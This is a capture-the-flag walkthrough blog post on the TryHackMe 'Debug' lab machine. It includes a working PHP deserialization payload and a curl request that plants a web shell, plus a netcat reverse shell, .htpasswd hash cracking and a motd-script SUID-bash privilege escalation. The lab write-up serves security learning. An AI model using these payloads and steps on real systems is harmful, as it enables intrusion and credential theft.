<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Debug | Umar_0x01 – Pentester | Programmer | Your average sakurity guy ( ͡~ ͜ʖ ͡°)</title><meta name=keywords content="tryhackme,ssh,http,metasploit,rustscan,php,deserialization,rce,privesc,cracking"><meta name=description content="Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/debug-thm/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.caa66081d39cc687cf0687b1d7531d2c05199587bff67f61907e111841aa442a.css integrity="sha256-yqZggdOcxofPBoex11MdLAUZlYe/9n9hkH4RGEGqRCo=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Debug"><meta property="og:description" content="Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/debug-thm/"><meta property="og:image" content="https://umar0x01.sh/images/debug-thm/Pasted%20image%2020210403143158.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-03T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-03T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/debug-thm/Pasted%20image%2020210403143158.png"><meta name=twitter:title content="TryHackMe - Debug"><meta name=twitter:description content="Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Debug","item":"https://umar0x01.sh/post/debug-thm/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Debug","name":"TryHackMe - Debug","description":"Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug","keywords":["tryhackme","ssh","http","metasploit","rustscan","php","deserialization","rce","privesc","cracking"],"articleBody":"Enumeration  IP: 10.10.51.225\n We can scan the host using rustscan (like nmap; but faster!) for open ports:\nrustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV  -a specifies the Host IP address --timeout specifies the timeout before saying the port is closed --tries how many times to try and connect to the port --ulimit specifies how many sockets to open at a time -- for passing arguments for nmap -sC -sV nmap arguments telling rustscan to run default scripts and version fingerprinting  Scan results:\n Alright, so, we’ve found 2 open ports. 22 and 80.\n┌──(root💀b0x)-[~/Downloads] [95/999] └─# rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \"/root/.rustscan.toml\" [~] Automatically increasing ulimit value to 5000. Open 10.10.51.225:22 Open 10.10.51.225:80 [~] Starting Script(s) [] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\") [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 13:04 PKT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed Initiating Ping Scan at 13:04 Scanning 10.10.51.225 [4 ports] Completed Ping Scan at 13:04, 0.34s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:04 Completed Parallel DNS resolution of 1 host. at 13:04, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 13:04 Scanning 10.10.51.225 [2 ports] Discovered open port 80/tcp on 10.10.51.225 Discovered open port 22/tcp on 10.10.51.225 Completed SYN Stealth Scan at 13:04, 0.25s elapsed (2 total ports) Initiating Service scan at 13:04 Scanning 2 services on 10.10.51.225 Completed Service scan at 13:05, 6.52s elapsed (2 services on 1 host) NSE: Script scanning 10.10.51.225. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 6.38s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.82s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed Nmap scan report for 10.10.51.225 Host is up, received reset ttl 60 (0.28s latency). Scanned at 2021-04-03 13:04:58 PKT for 14s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX 81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h | 256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs= | 256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da💿fc:67 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb 80/tcp open http syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds Raw packets sent: 6 (240B) | Rcvd: 3 (128B)  SSH (Port 22) Let’s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using BruteX and check the version for any vulnerabilities which are public and exploitable.\nFrom googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration\n–\nLet’s try and do it using metasploit’s module.\nWe can search for the module using search with an filter of port:22 for only searching for everything written for SSH/Port22 with enum\nsearch port:22 ssh_enum –\nLet’s run it.\n–\nWe can see that it enumerated the user root and can probably guess the password will be something really long. Let’s goto port 80 for now and we’ll come back to SSH if we need something.\n HTTP (Port 80) Let’s browse the application to get an idea in which programming language it was written, what’s it’s using as it’s backend server, etc.\nhttp://10.10.51.225/ So, we get meeted with Apache2’s default installation page. Let’s try and see if /robots.txt has something in it.\nhttp://10.10.51.225/robots.txt Sadly, it doesn’t exist either.\n–\nWe can now utilize gobuster or dirsearch to enumerate the hidden directories hosted on the web application.\nI’ll use dirsearch to save some time downloading and setting up gobuster.\npython3 dirsearch.py -u http://10.10.51.225 -e all -t 100 ┌──(root💀b0x)-[~/tools/dirsearch] └─# python3 dirsearch.py -u http://10.10.51.225 -e all -t 100 1 ⨯ /mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version! warnings.warn(\"urllib3 ({}) or chardet ({}) doesn't match a supported \" _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948 Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log Target: http://10.10.51.225/ Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt [13:30:03] Starting: [13:30:16] 403 - 277B - /.ht_wsr.txt [13:30:17] 403 - 277B - /.htaccessOLD [13:30:17] 403 - 277B - /.htaccess_orig [13:30:17] 403 - 277B - /.htaccess_sc [13:30:17] 403 - 277B - /.htaccessBAK [13:30:17] 403 - 277B - /.htaccess_extra [13:30:17] 403 - 277B - /.htaccessOLD2 [13:30:17] 403 - 277B - /.htm [13:30:17] 403 - 277B - /.htpasswd_test [13:30:17] 403 - 277B - /.html [13:30:17] 403 - 277B - /.httr-oauth [13:30:17] 403 - 277B - /.htpasswds [13:30:18] 403 - 277B - /.htaccess.sample [13:30:19] 403 - 277B - /.htaccess.save [13:30:19] 403 - 277B - /.htaccess.bak1 [13:30:19] 403 - 277B - /.htaccess.orig [13:30:20] 403 - 277B - /.php3 [13:30:21] 403 - 277B - /.php [13:30:35] 301 - 313B - /backup - http://10.10.51.225/backup/ [13:30:36] 200 - 2KB - /backup/ [13:30:45] 200 - 11KB - /index.html [13:30:46] 301 - 317B - /javascript - http://10.10.51.225/javascript/ [13:30:46] 200 - 6KB - /index.php [13:30:46] 200 - 6KB - /index.php/login/ [13:31:02] 200 - 2KB - /readme.md [13:31:03] 403 - 277B - /server-status/ [13:31:03] 403 - 277B - /server-status Task Completed –\nAlright, we can see /backup/ directory and /readme.md which also seems kinda interesting. Let’s visit these and see what’s hosted in them.\nhttp://10.10.51.225/readme.md Let’s cURL it.\n$~ curl -i http://10.10.51.225/readme.md # Welcome to Base  A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers. ## Reasons to use base for your next web project ### Responsive Design Built for all devices big and small, base has got you covered. ### Foundation Styles Custom styles for headings, tables, blockquotes forms and much more. ### Accessibility in mind Works with screen readers in mind and has JS fallbacks. ### Easy to learn Well commented CSS to ensure your implementation is a breeze. ### Cross-Browser Covers IE7+ and modern browsers such as Chrome, Firefox and Opera. ### Base is Awesome! Preview the [demo page](http://matthewhartman.github.com/base/demo/) to see the Base Framework in all its glory! :) ## Repo Contents 1. readme.md - Feel free to delete this! ;) 2. index.html - An example page with Base in action 3. style.css - Base stylesheet including styles for headings, tables, body content, etc 4. default.js - Base javascript file to get you started Base was built by Matthew Hartman (@hartmanmatthew), a passionate front end developer based in Melbourne, Australia. ## Thank You / Credits - Mark Otto (@mdo) \u0026 Jacob Thornton (@fat) for some base styles taken from BootStrap - Nicolas Gallagher (@necolas) for the Micro ClearFix :) We can see that it returns README.md source of some repository, maybe we can explore it later?\nFor now, let’s move to the /backup/ folder\nhttp://10.10.51.225/backup/ The /backup/ directory contains interesting .bak files, let’s cURL those one by one and see their source code.\n┌──(root💀b0x)-[~/tools/dirsearch] └─# curl -i http://10.10.51.225/backup/index.html.bak HTTP/1.1 200 OK Date: Sat, 03 Apr 2021 08:36:44 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Wed, 10 Mar 2021 01:10:05 GMT ETag: \"2c39-5bd2453bf4a05\" Accept-Ranges: bytes Content-Length: 11321 Content-Type: application/x-trash \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\" =\"http://www.w3.org/1999/xhtml\" for Ubuntu Last updated: 2014-03-19 See: https://launchpad.net/bugs/1288690 --  =\"Content-Type\" content=\"text/html; charset=UTF-8\" / Apache2 Ubuntu Default Page: It works =\"text/css\" media=\"screen\" * { margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; } body, html { padding: 3px 3px 3px 3px; background-color: #D8DBE2; font-family: Verdana, sans-serif; font-size: 11pt; text-align: center; } div.main_page { We can see that the page also points to default Apache installation page. Let’s try .php.bak file now.\nI’ll be downloading and analysing it in Sublime text (text editor).\n┌──(root💀b0x)-[~/tools/dirsearch] └─# curl http://10.10.51.225/backup/index.php.bak -O % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 6399 100 6399 0 0 10438 0 --:--:-- --:--:-- --:--:-- 10438 ┌──(root💀b0x)-[~/tools/dirsearch] └─# ┌──(root💀b0x)-[~/tools/dirsearch] └─# head index.php.bak =\"en\" class=\"no-js\"  =\"utf-8\" Base =\"description\" content=\"\" =\"viewport\" content=\"width=device-width, minimum-scale=1.0, maximum-scale=1.0\" =\"stylesheet\" media=\"screen\" href=\"style.css\"   –\nIn the heading, we can see that it too points to the same framework Base which was discussed above in the README.md file, let’s try searching this framework.\nSo, the guy has deleted this repository (base) from his github account. Maybe shifted somewhere else? Let’s try searching it on google rather than using the link from readme.md file.\nSeeing the readme.md contents again, we can probably deduce that this framework (if used) is only going to be used for styling. Since, it doesn’t mention anywhere in the README.md file that there is any PHP code in it.\n–\nWe can continue reading the source code of the index.php.bak file for now.\n–\nWe can see on line 216 – 220. We can just input a $_GET['debug'] debug parameter with serialize input and the source code will unserialize it.\nWe know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won’t execute/render as PHP on the server.\nWere there any hidden directories we missed while the enumeration?\nYes! we didn’t discuss /index.php file, let’s try accessing it.\nThe page looks something like this:\n–\nExploitation Alright, now time for the exploitation. Before that, we need to learn what PHP deserialization is and before that, what is serialization?\nWe use serialization when we want a piece of code or some object to be stored in a database or when we’re expecting some piece of code through an API call or something and then we want to execute it/load it.\nIf you’re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.\nTo not do the above^, we use serialization, it takes your piece of code/object, serializes it and stores in the database and while retreiving it, it unserializes the piece of code and executes it.\nFor the API call, it just receieves serialized code already and executes it while unserializing it.\nNote: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don’t even use deserialization if not really required. If it’s required, never let the user control the parameters!\nP.S ~ The above information about serialization is generic and not only based on PHP de(serialization)!\n You can find more details in this youtube video created by a friend of mine; Mukarram Khalid.\nSo, now that we’ve a base understanding of what serialization is, let’s move to the source code and see what we can exploit here.\n We can see that the PHP code is using a magic function (i.e. __destruct())\nphp class FormSubmit { public $form_file = 'message.txt'; public $message = ''; public function SaveMessage() { $NameArea = $_GET['name']; $EmailArea = $_GET['email']; $TextArea = $_GET['comments']; $this- message = \"Message From : \" . $NameArea . \" || From Email : \" . $EmailArea . \" || Comment : \" . $TextArea . \"\\n\"; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this-form_file,$this-message,FILE_APPEND); echo 'Your submission has been successfully saved!'; } } –\nWhat is __destruct? __destruct magic method is used to always run or do a task at the end of the execution. Let’s say we want to do something everytime (maybe update a local log file?), it’ll do that in the end of the execution.\nWhat is it doing in the above application?\npublic function __destruct() { file_put_contents(__DIR__ . '/' . $this-form_file,$this-message,FILE_APPEND); echo 'Your submission has been successfully saved!'; }  It’s creating a file in our __DIR__ (or pwd) in the directory and with the message whatever is specified (using the two properties being used from the class) It then echo’s a string: ‘Your submission has been successfully saved’  –\nNow, we can write our own code matching the above^ but just change the contents and the file name, let’s try it.\nRemember, we need to use the same class name and same properties names!\nphp class FormSubmit { public $form_file = 'umar0x01.php'; public $message = ''; } $newObj = new FormSubmit; echo serialize($newObj); ?Let’s run add this PHP code in a local file and run it.\nAlright, we get the serialized string:\nO:10:\"FormSubmit\":2:{s:9:\"form_file\";s:12:\"umar0x01.php\";s:7:\"message\";s:28:\"$_GET[123]); ?\";} Let me try and walk you through the whole serialized string.\n O means object O:10 means object name’s length (i.e. - 10) 2:{ means there are two properties/attributes s:9 means that our property/attribute is a string and is of length of 9 chars s:9:\"form_file\"; Length of 9 and property name  Probably, that explained the serialized string. You can always google for more details!\n Now, we need to URL encode our string and pass it into the debug parameter in the application.\nFor URL encoding, I’ll use cyberchef.\nURL Encoded string looks like:\nO%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D Let’s pass this in the URL and see if our new file get’s created.\nYay! It did, the string printed in the bottom indicates that.\nHere’s the cURL request, if you’ve problems reproducing the above:\ncurl -i 'http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}' --globoff \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \\ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \\ -H 'Accept-Language: en-US,en;q=0.5' \\ -H 'Connection: close' –\nNow, let’s access the .php file with our RCE code in it and get reverse shell!\n–\nview-source:http://10.10.51.225/umar0x01.php?123=ls%20-la –\nWe can generate RCE payloads to fallback if something isn’t present utilizing reverse-shell.sh and call it with cURL.\n–\nI’ll let you figure out what’s happening below, just remember that I wrote the above shell script generated in a file named shell.sh in my local directory since the machine doesn’t have access to the internet.\n Reverse Shell: Now that we’ve reverse shell, let’s try and get tty shell and make it interactive!\n–\nFirst, we’ll get the tty shell using python’s onliner:\npython3 -c \"__import__('pty').spawn('/bin/bash')\" ┌──(root💀b0x)-[/mnt/hgfs/THM/Debug] └─# nc -nlvp 4444 listening on [any] 4444 ... connect to [10.17.0.120] from (UNKNOWN) [10.10.51.225] 50224 /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ which python /usr/bin/python $ which python3 /usr/bin/python3 $ python3 -c \"__import__('pty').spawn('/bin/bash')\" www-data@osboxes:/var/www/html$www-data@osboxes:/var/www/html$id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@osboxes:/var/www/html$www-data@osboxes:/var/www/html$–\nNow that we’ve tty shell, let’s make it interactive (i.e. Ctrl + C or other things don’t exit the shell!)\nNote: We need bash shell to make it interactive!\nType: ‘Ctrl + Z’ and background the process.\nNow we’ll use:\nstty raw -echo And then type fg to foreground the process (get it back)\n–\nNow that we’ve interactive shell, let’s add the rows/cols (generic) and add some colors UwU!\nPS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' # green alias ls='ls --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto' alias ll='ls -alFh' alias la='ls -A' alias l='ls -CF' –\nstty rows 48 stty columns 211 export TERM=screen –\nAlright, we got the initial shell and it’s fully interactive! Time to get the initial flag and privesc our way to root!\n–\nWe can find a .htpasswd (usually used for HTTP authentication) file right in /var/www/html/ containing the following credentials:\nwww-data@osboxes:/var/www/html$ cat .htpasswd james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1 Let’s run john and try to crack these.\n┌──(root💀b0x)-[/mnt/hgfs/THM/Debug] └─# john htpasswd.hash Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 84 candidates buffered for the current salt, minimum 96 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist jamaica (james) 1g 0:00:00:00 DONE 2/3 (2021-04-03 14:42) 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888 Use the \"--show\" option to display all of the cracked passwords reliably Session completed –\nWe get a password: jamaica\nWhere can we use it? Let’s see /etc/passwd file if it contains any other users except for www-data and root\nwww-data@osboxes:/var/www/html$ cat /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false _apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false lightdm❌108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie❌109:117::/nonexistent:/bin/false avahi-autoipd❌110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi❌111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq❌112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord❌113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher❌114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip❌115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops❌116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse❌117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit❌118:126:RealtimeKit,,,:/proc:/bin/false saned❌119:127::/var/lib/saned:/bin/false usbmux❌120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false james❌1001:1001::/home/james:/bin/bash sshd❌121:65534::/var/run/sshd:/usr/sbin/nologin Alright, we can try the credentials against the user: james\n–\nFlag (user.txt) –\nTime for privesc!\n Privileges Escalation Before running LinEnum, LSE or LinPeas, let’s try and do some manual enumeration first!\n–\nLet’s try and get the list of binaries we can run with sudo!\njames@osboxes:~$ sudo -l [sudo] password for james: Sorry, user james may not run sudo on osboxes. Nothing we can run with sudo! :(\n–\nLet’s try and list the crontabs (if any)\njames@osboxes:~$ crontab -l no crontab for james Nothing there as well!\n–\nWe can see that .bash_history is present in the directry, let’s check it out.\njames@osboxes:~$ cat .bash_history ls clear exit ls clear exit ls clear exit ls cd /home/james/ ls cat Note-To-James.txt ls cd /etc/update-motd.d/ ls ls -la ls clear ls clear ls clera ls clear ls clear ls -la cd / ls cd /root/ ls exit ls clear exit nano id_rsa chmod 600 id_rsa ssh -i id_rsa root@10.250.0.12 exit –\nWe’ve a note file in the local directory:\njames@osboxes:~$ cat Note-To-James.txt Dear James, As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? But there's still one thing I'd like you to do, before the submission. Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D I gave you access to modify all these files :) Oh and one last thing... You gotta hurry up! We don't have much time left until the submission! Best Regards, root –\nWe’ve seen .bash_history containing a directory /etc/update-motd.d/, let’s check it out!\njames@osboxes:~$ ls -la /etc/update-motd.d/ total 44 drwxr-xr-x 2 root root 4096 Mar 10 18:38 . drwxr-xr-x 134 root root 12288 Mar 10 20:08 .. -rwxrwxr-x 1 root james 1220 Mar 10 18:32 00-header -rwxrwxr-x 1 root james 0 Mar 10 18:38 00-header.save -rwxrwxr-x 1 root james 1157 Jun 14 2016 10-help-text -rwxrwxr-x 1 root james 97 Dec 7 2018 90-updates-available -rwxrwxr-x 1 root james 299 Jul 22 2016 91-release-upgrade -rwxrwxr-x 1 root james 142 Dec 7 2018 98-fsck-at-reboot -rwxrwxr-x 1 root james 144 Dec 7 2018 98-reboot-required -rwxrwxr-x 1 root james 604 Nov 5 2017 99-esm We can see that we’ve read/write/execute permissions on the files. But what can we do with these?\njames@osboxes:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland  # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026\u0026 . /etc/lsb-release if [ -z \"$DISTRIB_DESCRIPTION\" ] \u0026\u0026 [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \"Welcome to %s (%s %s %s)\\n\" \"$DISTRIB_DESCRIPTION\" \"$(uname -o)\" \"$(uname -r)\" \"$(uname -m)\" Alright, seems like simple bash commands, let’s just copy bash to tmp and set root’s SUID bit on it and see if that works.\nAdded the instructions in 3-4 lines.\njames@osboxes:/etc/update-motd.d$ cat 00-header #!/bin/sh cp /bin/bash /tmp/ chmod u+s /tmp/bash # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland  # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026\u0026 . /etc/lsb-release if [ -z \"$DISTRIB_DESCRIPTION\" ] \u0026\u0026 [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \"Welcome to %s (%s %s %s)\\n\" \"$DISTRIB_DESCRIPTION\" \"$(uname -o)\" \"$(uname -r)\" \"$(uname -m)\" But how does this execute? Is there a cron? don’t think so.\nSince, the .bash_history shows we need to ssh for the instructions to execute, let’s try and SSH as james.\nRoot! Cool, we’ve got SUID bit of root user on the bash file, let’s get root! :)\njames@osboxes:~$ /tmp/bash -p bash-4.3# id uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james) bash-4.3# cd /root bash-4.3# ls -al total 48 drwx------ 7 root root 4096 Mar 10 18:36 